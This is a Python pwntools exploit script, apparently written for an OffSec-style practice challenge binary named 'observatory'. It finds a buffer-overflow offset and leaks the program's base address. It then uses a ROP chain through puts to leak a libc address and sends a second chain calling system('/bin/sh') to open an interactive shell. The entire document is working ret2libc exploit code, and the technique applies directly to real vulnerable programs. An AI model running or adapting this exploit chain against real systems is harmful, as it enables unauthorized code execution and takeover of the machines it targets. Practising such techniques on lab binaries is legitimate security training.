from pwn import *
context.binary = elf = ELF('/home/kali/Desktop/offsec/prove/08_observatory/chall', checksec=False)
libc = elf.libc

# No canary, partial RELRO, nx+pie

def find_saved_rip_offset():
    p = process(elf.path)
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Payload:\n', cyclic(200))
    p.wait()

    core = p.corefile
    crash_val = core.read(core.rsp, 4)
    offset = cyclic_find(crash_val)

    print(f"Found saved rip offset: {offset}")
    return offset

saved_rip_offset = find_saved_rip_offset()

p = process(elf.path)

#leak elf_base
p.sendlineafter(b'> ', b'1')
leak = p.recvline().strip()
main_addr = int(leak.split(b'@ ')[1], 16)
print(f"Main address: {hex(main_addr)}")

elf.address = main_addr - elf.sym.main
puts_plt = elf.plt['puts']
read_got = elf.got['read']

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi_ret_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]

#leak libc with puts(read@got)
payload1 = flat(
    b'A'*saved_rip_offset,
    p64(ret_gadget),
    p64(pop_rdi_ret_gadget), p64(read_got),
    p64(puts_plt),
    p64(elf.sym.main)
)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Payload:\n', payload1)
leaked = p.recvline().strip()
print(leaked)
leak_read = u64(leaked.ljust(8, b'\x00'))
print(f"puts leak = {leak_read:#x}")


libc.address = leak_read - libc.sym.read
binsh = next(libc.search(b'/bin/sh\x00'))

payload2 = flat(
    b'A'*saved_rip_offset,
    #p64(ret_gadget),
    p64(pop_rdi_ret_gadget), p64(binsh),
    p64(libc.sym.system),
)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Payload:\n', payload2)
p.interactive()